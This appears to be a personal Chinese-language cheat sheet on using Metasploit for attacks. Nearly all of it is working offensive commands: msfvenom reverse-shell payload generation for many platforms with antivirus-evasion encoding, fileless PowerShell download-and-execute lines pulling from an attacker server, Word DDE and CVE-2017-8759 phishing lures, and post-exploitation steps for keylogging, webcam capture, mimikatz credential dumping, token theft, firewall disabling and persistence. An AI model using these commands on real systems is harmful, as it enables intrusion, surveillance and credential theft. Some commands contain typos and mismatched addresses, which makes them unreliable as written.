# METASPLOIT

exploit-db

•Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。

~~~~~markdown
渗透攻击（exploit）
测试者利用系统，程序，或服务的漏洞进行攻击的一个过程。
攻击载荷（payload）
攻击者在目标系统上执行的一段攻击代码，该代码具有返弹连接，创建用户，执行其他系统命令的功能
shellcode
在目标机器上运行的一段机器指令，成功执行后会返回一个shell
模块（module）
是指Metasploit框架中所使用的一段软件代码组件。
监听器（listener）
监听器是metasploit中用来等待介入网络连接的组件。
~~~~~

启动设置

~~~~markdown
service postgresql start
service metasploit start
msfconsole
进入后输入db_status 查看数据库连接状态
workspace  -a  test  创一个工作台
删除 -d 选项 
进入test工作台
Wordspace test
使用nmap
db_nmap -sS 192.168.80.1   扫描主机
db_export 1.xml  导出扫描结果
db_import 1.xml  导入扫描结果
hosts  查看扫描结果
~~~~

## 信息收集

~~~markdown
①whois查询：
msf > whois example.com
②http://searchdns.netcraft.com/在线收集服务器 IP信息工具
③nslookup
msf> db_nmap –sS –A192.168.1.111
msf> db_services #查看扫描结果

msf> search portscan
msf> use auxiliary/scanner/postscan/syn

smb_version 模块：
msf> use auxiliary/scanner/smb/smb_version
找 mssql 主机：
msf> use auxiliary/scanner/mssql/mssql_ping
SSH 服务器扫描：
msf> use auxiliary/scanner/ssh/ssh_version
Telnet服务器扫描
msf> use auxiliary/scanner/telnet/telnet_version
FTP 主机扫描：
msf> use auxiliary/scanner/ftp/ftp_version
FTP 匿名登录：
useauxiliary/scanner/ftp/anonymos
扫描局域网内有哪些主机存活
useauxiliary/scanner/discovery/arp_sweep
扫描网站目录
auxiliary/scanner/http/dir_scanner
搜索网站中的E-mail地址
search_email_collector
use auxiliary/gather/search_email_collector
嗅探抓包
msf> use auxiliary/sniffer/psnuffle
~~~

## msf密码破解模块

~~~~markdown
ssh服务口令猜测
use auxiliary/scanner/ssh/ssh_login
mysql口令攻击
search mysql
use auxiliary/scanner/mysql/mysql_login
postgresql攻击
search  postgresql
use auxiliary/scanner/postgres/postgres_login
tomcat 攻击
search tomcat
use auxiliary/scanner/http/tomcat_mgr_login
telnet 攻击
use auxiliary/scanner/telnet/telnet_login
samba攻击
use auxiliary/scanner/smb/smb_login
~~~~

## msf漏洞利用模块

~~~~markdown
常用漏洞利用命令
search <name> 
用指定关键字搜索可利用漏洞
use <exploit name>
 使用漏洞
show options 
显示选项
set <OPTION NAME> <option>
 设置选项
show payloads 显示装置
show targets 显示目标(os版本)
set TARGET <target number> 设置目标版本
exploit 开始漏洞攻击
sessions -l 列出会话
sessions -i <ID> 选择会话
sessions -k <ID> 结束会话
<ctrl> z 把会话放到后台
<ctrl> c 结束会话
show auxiliary 显示辅助模块
use <auxiliary name> 使用辅助模块
set <OPTION NAME> <option> 设置选项
run 运行模块
~~~~

word钓鱼

web_delivery

## MSF PAYLOAD模块

•msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。

**payload参数：**

~~~~markdown
a. -p：指定payload，一般用 windows/meterpreter/reverse_tcp 比较多
b. -e：指定要用的编码器，一般用 shikata_ga_nai ，其他的都不太好用
c. -i：指定编码次数，后面跟数字，如：-i 8
d. -b：设定规避字符集，指定需要过滤的坏字符，如：'\x0f'、'\x00'
e. -f：指定输出格式，如：-f exe
f. -o：指定生成文件存放位置，也可用>代替
g. -l：列出指定模块的所有可用资源
h. -a：指定payload的目标架构，如x86，x64，x86_64，默认为32位程序
i. -s：设定payload的最大长度，即文件大小
j. --platform：指定payload的目标平台，如windows，linux
k. 其余参数可用 -h 查看
例子：msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP>
lport=<port> -f exe -o payload.exe
~~~~

## **建立监听**

~~~~markdown
1. 常规监听
    msfconsole：进入msf控制台
    use exploit/multi/handler：使用模块
    set payload windows/meterpreter/reverse_tcp：设置payload
        set lhost <ip>：设置要侦听的ip
    	set lport <port>：设置要侦听的端口
    	options：查看设置详情）
   	 	run或exploit
2. 快速监听：默认持续侦听
    msfconsole：进入msf控制台
    handler -H <ip> -P <port> -p <payload>
3.  其他
	exploit -j -z：后台持续监听，-j是后台任务，-z是持续监听，使用jobs查看和管理
	jobs -K可结束所有任务。
	sessions -l：查看我的会话
	sessions -i 1：调用我的1号会话
~~~~

~~~~markdown
payload可持续化：
 因为生成木马反弹payload后容易被杀死，而手动迁移进程的
migrate有一个操作间隔，所以可以在生成payload时就加上进程迁移，
即生成木马时加上：
PrependMigrate=true 
PrependMigrateProc=svchost.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1122 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o  shell.exe

~~~~

## 各种平台payload生成

~~~markdown
Linux
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT=1122 -a x86 --platform Linux -f elf > shell.elf
Windows
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=1122 -f exe > shell.exe
Mac
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
Android
	msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST= LPORT=1122 -f raw > shell.apk
	msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT=1122 R > test.apk

安卓免杀 rat yutube
~~~



~~~~
查看windows/meterpreter/reverse_tcp支持什么平台、哪些选项，可以使用msfvenom -p windows/meterpreter/reverse_tcp --list-options

msfvenom --list payloads可查看所有payloads

msfvenom --list encoders可查看所有编码器
评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器

类似可用msfvenom --list命令查看的还有payloads, encoders, nops, platforms, archs, encrypt, formats
~~~~

## 生成payload

~~~~markdown
Powershell
    msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST= LPORT=1122 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1
Netcat
nc正向连接
    msfvenom -p windows/shell_hidden_bind_tcp LHOST= LPORT=1122  -f exe> 1.exe
nc反向连接，监听
    msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=1122  -f exe> 1.exe

PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

~~~~

## powershell msf无文件攻击

powershell  必须加/x64/

~~~~markdown
上面生成的木马都是要发送到服务器运行才行，有落地文件，会有痕迹，如果
想建立会话的同时不想在服务器留文件，可以用无文件攻击，通过命令远程加
载代码到内存运行，一旦重启无法溯源。
具体操作：
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=148.28.27.106 lhost=1234 -f psh-reflection > x.ps1
（这一步生成ps脚本文件）
启用vps，搭建网站，把文件放在网站目录里，通过对外部文件的访问来
http://149.28.27.106/x.ps1
进行调用，如vps的ip为192.168.8.1
建立侦听
在目标机的命令行输入：powershell IEX (New-Object 
Net.Webclient).DownloadString('http://149.28.27.106/x.ps1')，运行
进行调用，如vps的ip为192.168.8.1
建立侦听
在目标机的命令行输入：powershell IEX (New-Object 
Net.Webclient).DownloadString('http://149.28.27.106/x.ps1')，运行
建立连接
~~~~

## WORD钓鱼

~~~
新建word设置域，
DDEAUTO C:\\windows\\system32\\cmd.exe "/k powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.8.1/x.ps1')
~~~

![image-20220220222959832](E:\学习\picture\image-20220220222959832.png)

![image-20220220223010482](E:\学习\picture\image-20220220223010482.png)

![image-20220220223039032](E:\学习\picture\image-20220220223039032.png)

## msf使用宏钓鱼

~~~~markdown
git clone https://github.com/bhdresh/CVE-2017-8759.git
python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.80.132/logo.txt

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.80.132 LPORT=1133 -f exe > /root/shell.exe

捆绑后开80端口 netstat -tnlp
python cve-2017-8759_toolkit.py -M exp -e http://192.168.80.132/shell.exe -l /root/shell.exe

开启监听模块，发送给目标运行钓鱼文件，等代上线

~~~~

![image-20220220223210254](E:\学习\picture\image-20220220223210254.png)

![image-20220220223230318](E:\学习\picture\image-20220220223230318.png)

![image-20220220223702428](E:\学习\picture\image-20220220223702428.png)

![image-20220220223716847](E:\学习\picture\image-20220220223716847.png)

![image-20220220223727660](E:\学习\picture\image-20220220223727660.png)

## msf制作excle钓鱼

**web_delivery**

~~~~markdown
use exploit/multi/script/web_delivery
set target 2
	target regsvr32 	windows/64/meterpreter/reverse_tcp
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.3.143
set URIPATH /
exploit 
~~~~

![image-20220220230152779](E:\学习\picture\image-20220220230152779.png)

powershell -w hidden -nop IEX (New-Object 
Net.Webclient).DownloadString('http://192.168.8.1/x.ps1')

## ngrok转发

•本机安装客户端

•./sunny clientid id号



## Msf5-Evasion模块免杀

~~~~markdown
show evasion

http://virustotal.com/   验证静态免杀 bypass
~~~~

## shellter免杀

•shellcode代码注入工具

•https://www.shellterproject.com/download/

### py免杀

~~~~markdown
生产py文件的payload
msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.8.124 -i 11 -f py -o msf.py 
建立侦听
将生成的py文件修改处理
下载pyinstall：https://nchc.dl.sourceforge.net/project/pyinstaller/2.0/pyinstaller-2.0.zip
解压安装
安装pywin32
pip.exe install pywin32
python.exe pyinstaller-2.0\pyinstaller.py --console --onefile  pyinstaller-2.0\11.py
~~~~

## venom免杀paylaod

~~~markdown
下载地址：https://github.com/r00t-3xp10it/venom

sudo ./setup.sh
运行
sudo ./venom.sh

~~~

## Meterpreter后渗透模块

~~~text
 Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。
~~~

权限，使用平台，环境

### 基础命令

~~~~~markdown
进程迁移
migrate
关闭杀软  ——失效—— run killav
	通过服务关闭
通过其 shell 来关闭防火墙
netsh adcfirewall set allprofiles state off
查看目标机所有流量
run packetrecorder -i 1
提取系统信息
run scraper
ps 查看进程
migrate 1774 切换进程
截屏  screenshot
获取系统运行的平台 sysinfo
cat c:\boot.ini#查看文件内容,文件必须存在
del c:\boot.ini #删除指定的文件
upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\\windows\\system32\
download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini /root/
edit c:\boot.ini  # 编辑文件
getwd#打印工作目录
cd#更改本地目录
ls#列出在当前目录中的文件列表
pwd#输出工作目录
cd c:\\ #进入目录文件下
rm file #删除文件
mkdir dier #在受害者系统上的创建目录
rmdir#受害者系统上删除目录
dir#列出目标主机的文件和文件夹信息
mv#修改目标主机上的文件名
search -d d:\\www -f web.config #search 文件，如
search  -d c:\\  -f *.doc
run vnc   查看桌面
	修改vnc配置
run  getgui  -e   开启目标主机远程桌面
sysinfo   命令为显示远程主机的系统信息
execute  -f notepad.exe
execute -h  显示帮助信息。-f为执行要运行的命令
如果希望隐藏后台执行，加参数-H
execute  -H -f notepad.exe

~~~~~

### 摄像头命令

~~~~
record_mic　　　 #音频录制

webcam_chat　　#查看摄像头接口

webcam_list　　　#查看摄像头列表

webcam_stream　#摄像头视频获取
~~~~

### 端口转发（不需要高权限，正常会话权限）

~~~markdown
portfwd -h
用法：portfwd [-h] [add | delete | list | flush] [args]
选项：
    -L <opt>要监听的本地主机（可选）
    -h帮助横幅
    -l <opt>要监听的本地端口
    -p <opt>连接到的远程端口
    -r <opt>要连接到的远程主机
portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444

rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名 -p 密码
rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接

~~~

### 键盘记录

~~~~markdown
keyscan_start：开启键盘记录功能
keyscan_dump：显示捕捉到的键盘记录信息
keyscan_stop：停止键盘记录

~~~~

### HASH获取

~~~~~markdown
meterpreter > load mimikatz  #加载mimikatz
		--kiwi--
meterpreter > msv #获取hash值
meterpreter > kerberos #获取明文（system权限）
meterpreter >ssp   #获取明文信息
meterpreter > wdigest #获取系统账户信
meterpreter >mimikatz_command -f a::   #必须要以错误的模块来让正确的模块显示
meterpreter >mimikatz_command -f hash::   #获取目标 hash
meterpreter > mimikatz_command -f samdump::hashes
meterpreter > mimikatz_command -f sekurlsa::searchPa
run post/windows/gather/smart_hashdump

win7 有uac控制
~~~~~

### 嗅探

~~~markdown
use sniffer # 加载嗅探模块
sniffer_interfaces #列出目标主机所有开放的网络接口
sniffer_start 2 #获取正在实施嗅探网络接口的统计数据
sniffer_dump 2 /tmp/test2.cap #在目标主机上针对特定范围的数据包缓冲区启动嗅探
sniffer_stop  2   #停止嗅探

对抓取的包进行解包：
use auxiliary/sniffer/psnuffle
set pcapfile 1.cap
run
wireshark，加载这个/tmp/xpsp1.cap 也可

~~~

### 盗取令牌

~~~~markdown
meterpreter >use incognito    加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)
meterpreter >list_tokens -u    列出目标主机用户的可用令牌
meterpreter >list_tokens -g    列出目标主机用户组的可用令牌
meterpreter >impersonate_token DOMAIN_NAME\\USERNAME    假冒目标主机上的可用令牌,如meterpreter > impersonate_token QLWEB\\Administrato
~~~~

### 持久控制服务器

~~~~
注册表，

服务后门，

计划任务，

​	360，火绒绕过

​	cs 调用powershell 无文件攻击
	web_delivery

rookit（linux）
~~~~

